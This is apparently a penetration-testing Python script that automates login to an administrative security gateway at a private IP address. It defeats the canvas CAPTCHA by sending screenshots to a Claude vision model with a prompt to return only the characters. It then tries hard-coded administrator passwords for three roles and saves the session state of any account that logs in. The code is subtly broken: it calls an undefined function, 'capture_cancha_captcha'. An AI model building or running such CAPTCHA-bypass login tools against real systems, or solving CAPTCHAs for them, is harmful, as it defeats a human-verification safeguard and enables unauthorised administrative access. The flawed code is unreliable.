#!/usr/bin/env python3
"""
海泰方圆综合安全网关 - AI视觉验证码识别登录
流程：截图验证码 -> Claude Vision分析 -> 自动填表登录
"""

import base64
import time
import json
import re
from playwright.sync_api import sync_playwright

TARGET_IP = "192.168.110.243"
TARGET_URL = f"https://{TARGET_IP}:8443"
SCREENSHOT_DIR = "/root/AI/VPN_test/screenshots"

# 账号矩阵
ACCOUNTS = {
    "系统管理员": "1111aaa*",
    "安全管理员": "1111aac*",
    "审计管理员": "1111aab*",
}

def capture_canvas_captcha(page):
    """截取canvas验证码"""
    try:
        # 等待canvas加载
        page.wait_for_selector('canvas', timeout=10000)
        canvas = page.locator('canvas').first
        box = canvas.bounding_box()
        print(f"[+] Canvas位置: {box}")

        # 截图验证码区域
        captcha_path = f"{SCREENSHOT_DIR}/captcha_vision.png"
        canvas.screenshot(path=captcha_path)
        print(f"[+] 验证码截图已保存: {captcha_path}")
        return captcha_path
    except Exception as e:
        print(f"[-] 截图失败: {e}")
        return None

def analyze_captcha_vision(image_path):
    """调用Claude Vision分析验证码"""
    try:
        from anthropic import Anthropic
        client = Anthropic()

        with open(image_path, "rb") as f:
            image_data = base64.b64encode(f.read()).decode()

        message = client.messages.create(
            model="claude-haiku-4-6-20250501",
            max_tokens=10,
            messages=[{
                "role": "user",
                "content": [
                    {
                        "type": "image",
                        "source": {
                            "type": "base64",
                            "media_type": "image/png",
                            "data": image_data
                        }
                    },
                    {
                        "type": "text",
                        "text": "这是一个验证码图片，请只返回验证码的4个字符，不要任何解释。例如：ABCD"
                    }
                ]
            }]
        )

        captcha_text = message.content[0].text.strip()
        # 过滤掉非字母数字
        captcha_text = re.sub(r'[^A-Za-z0-9]', '', captcha_text)
        print(f"[+] Vision识别结果: {captcha_text}")
        return captcha_text[:4] if len(captcha_text) >= 4 else captcha_text

    except Exception as e:
        print(f"[-] Vision分析失败: {e}")
        return None

def login_with_credentials(page, username, password, captcha):
    """执行登录"""
    try:
        # 选择用户类型
        page.select_option('#normal_login_type', username)
        page.wait_for_timeout(500)

        # 输入密码
        page.fill('#normal_login_password', password)
        page.wait_for_timeout(200)

        # 输入验证码
        page.fill('#normal_login_vercode', captcha)
        page.wait_for_timeout(200)

        # 点击登录
        page.click('#normal_login_btn')
        page.wait_for_timeout(3000)

        # 检查是否成功
        if "login" not in page.url.lower():
            print(f"[+] {username} 登录成功!")
            return True
        else:
            print(f"[-] {username} 登录失败，可能验证码错误")
            return False

    except Exception as e:
        print(f"[-] 登录过程出错: {e}")
        return False

def main():
    print("=" * 60)
    print("海泰方圆综合安全网关 - AI视觉验证码登录")
    print("=" * 60)

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)  # 非headless可以看到过程
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()

        # 访问登录页
        print(f"\n[*] 访问登录页面: {TARGET_URL}/login?type=pwd")
        page.goto(f"{TARGET_URL}/login?type=pwd", timeout=60000)
        page.wait_for_load_state('networkidle')
        page.wait_for_timeout(2000)

        # 先截取完整页面确认
        page.screenshot(path=f"{SCREENSHOT_DIR}/login_full.png", full_page=True)
        print("[+] 登录页面已截图")

        # 尝试每个账号
        for username, password in ACCOUNTS.items():
            print(f"\n[*] 尝试账号: {username}")

            # 如果不是第一次，先刷新页面获取新验证码
            if username != "系统管理员":
                page.goto(f"{TARGET_URL}/login?type=pwd", timeout=60000)
                page.wait_for_load_state('networkidle')
                page.wait_for_timeout(2000)

            # 截取验证码
            captcha_path = capture_cancha_captcha(page)
            if not captcha_path:
                continue

            # Vision分析
            captcha_text = analyze_captcha_vision(captcha_path)
            if not captcha_text:
                print(f"[-] 无法识别验证码，跳过")
                continue

            # 登录
            success = login_with_credentials(page, username, password, captcha_text)
            if success:
                # 保存cookie/session供后续使用
                context.storage_state(path=f"{SCREENSHOT_DIR}/.{username.replace(' ', '_')}_state.json")
                print(f"[+] {username} 登录状态已保存")
                break

        # 等待用户确认
        input("\n[*] 按回车键退出...")

if __name__ == "__main__":
    main()
